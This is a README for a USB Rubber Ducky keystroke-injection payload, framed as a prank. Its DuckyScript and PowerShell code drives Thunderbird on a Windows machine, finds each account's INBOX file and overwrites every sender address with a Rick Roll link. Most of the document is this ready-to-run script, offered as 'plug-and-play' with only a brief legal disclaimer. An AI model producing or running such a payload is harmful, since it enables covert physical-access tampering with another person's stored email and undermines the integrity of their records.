# Prank In The Middle - Thunderbird

The name of the payload `Prank In The Middle` is named after the pun Prank + Man In The Middle in that this operation, in some ways, can remotely be configured as a MITM attack but since it was created specifically for playful purposes then here is the reason for the union with the word Prank.

**Category**: Prank

**Plug-And-Play** ^^

## Index

- [Description](#description)
- [Requirements](#requirements)
- [How the Program Works](#how-the-program-works)
- [Code Details](#code-details)
    - [System Detection && Short Start DELAY](#system-detection--short-start-delay)
    - [Navigating in Thunderbird](#navigating-in-thunderbird)
    - [Opening PowerShell and Email Manipulation](#opening-powershell-and-email-manipulation)
    - [The Regex](#the-regex)
- [Notes](#notes)
- [Credits](#credits)

## Description

This program automates a series of actions on a Windows system (*tested on Windows 10 but should works in Windows 11*) to manipulate the contents of emails found in a Thunderbird profile. Specifically, it identifies emails in the `INBOX` file of each configured email account and replaces the sender's email addresses with a fictitious address `Rick.Roll@tinyurl.com/prinkrollme` where `prinkrollme` is the union of the words `Prank`, `Rick Roll` and `Me` (*this one was necessary becouse prinkwoll era già stato preso* **:c** *so sad...* ) all compressed into the link `tinyurl.com/prinkrollme` ([*3° note*](#notes)) that redirect to the YouTube video `https://www.youtube.com/watch?v=xMHJGd3wwZk`.

![](https://i.ibb.co/VJjfbkJ/1.png)

## Requirements

- A Windows system with Thunderbird installed.
- Access to PowerShell.
- Permissions to run code in Powershell

## Test Environment

- Thunderbird 115.11.1 (64 bit)
- Windows 10 Pro

## How the Program Works

1. **System Detection:** The program detects if the system reflects the CAPSLOCK state and sets a dynamic delay based on this.
2. **Opening Thunderbird:** Uses a series of commands to open Thunderbird and navigate to the profile folder settings.
3. **Copying the Profile Folder Path:** Copies the profile folder path to the clipboard.
4. **Opening PowerShell:** Opens a PowerShell window and navigates to the `ImapMail` folder of the Thunderbird profile.
5. **Email Manipulation:** Uses PowerShell to:
   - Find all `INBOX` folders within `ImapMail`.
   - Read the contents of the emails in `INBOX`.
   - Replace the sender addresses with `Rick Roll <Rick.Roll@tinyurl.com/prinkrollme>`.
   - Save the modified content back to the original email files.

## Code Details

### System Detection && Short Start DELAY

```plaintext
EXTENSION DETECT_READY
    REM VERSION 1.1
    REM AUTHOR: Korben
    ...
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120

    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION
```

### Navigating in Thunderbird

```plaintext
WIN r
STRING thunderbird
ENTER
DELAY 1000
REPEAT 4 TAB
ENTER
DELAY 500
REPEAT 2 UPARROW
ENTER
DELAY 500
REPEAT 3 UPARROW
ENTER
DELAY 500
REPEAT 11 TAB
ENTER
DELAY 500
REPEAT 4 TAB
SPACEBAR
ENTER
CTRL c
ALT F4
```

### Opening PowerShell and Email Manipulation

```plaintext
WIN r
STRING powershell
ENTER
DELAY 1500
STRING cd 
CTRL v
ENTER

STRINGLN
    cd ImapMail
    $directories = Get-ChildItem -Directory | Select-Object FullName
    foreach ($dir in $directories) {
        $newPath = $dir.FullName -replace '\\', '/'
        $newPath += "/INBOX"
        if (Test-Path $newPath) {
            $emails = Get-Content -Path $newPath -Raw
            $modifiedEmails = $emails -replace "From:\s.*\s<(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*|`"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*`")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:(2(5[0-5]|[0-4][0-9])|1[0-9][0-9]|[1-9]?[0-9]))\.){3}(?:(2(5[0-5]|[0-4][0-9])|[1-9]?[0-9])|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])>", "From: Rick Roll <Rick.Roll@tinyurl.com/prinkrollme>"
            Set-Content -Path $newPath -Value $modifiedEmails -Force
        }
    }
END_STRINGLN
DELAY 1000
ALT F4
```

### The Regex

The regex was not created from scratch but was taken from the discussion “[How can I validate an email address using a regular expression?](https://stackoverflow.com/questions/201323/how-can-i-validate-an-email-address-using-a-regular-expression)” posted on **StackOverflow**.

```plaintext
(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*|`"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*`")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:(2(5[0-5]|[0-4][0-9])|1[0-9][0-9]|[1-9]?[0-9]))\.){3}(?:(2(5[0-5]|[0-4][0-9])|[1-9]?[0-9])|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])
```

The only difference is the addition of `**From: <...>**` which reduces to just the email addresses that sent the emails and not all addresses detected in the file that might depict other references

```plaintext
From:\s.*\s<...>
```

## Notes

1) This program was created for educational and demonstrative purposes. Unauthorized alteration of emails is illegal, and violating others' privacy is a crime.
2) Ensure you have the necessary permissions before running any script that modifies personal or sensitive data.
3) Considering [Staged Payloads](https://github.com/hak5/usbrubberducky-payloads?tab=readme-ov-file#staged-payloads), generally, it is not possible to include code that downloads from external sources. In this case, however, the setup involves a redirect to a YouTube video, which has been conveniently shortened using `tiny.url`. It is important to note that this redirect can be modified, and I strongly recommend changing it to a personal link for your security. While I assure you that I will never alter the link, no one can guarantee that I won't be compromised, allowing someone else to alter the redirect. It is always advisable and a good practice to never use links found online without understanding the actual redirect and replacing it with your own link.

## Credits

<h2 align="center"><a href="https://aleff-gitlab.gitlab.io/">Aleff</a></h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://github.com/aleff-github">
        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/github.png?raw=true width="48" height="48" />
      </a>
      <br>Github
    </td>
    <td align="center" width="96">
      <a href="https://www.linkedin.com/in/alessandro-greco-aka-aleff/">
        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/linkedin.png?raw=true width="48" height="48" />
      </a>
      <br>Linkedin
    </td>
  </tr>
</table>
</div>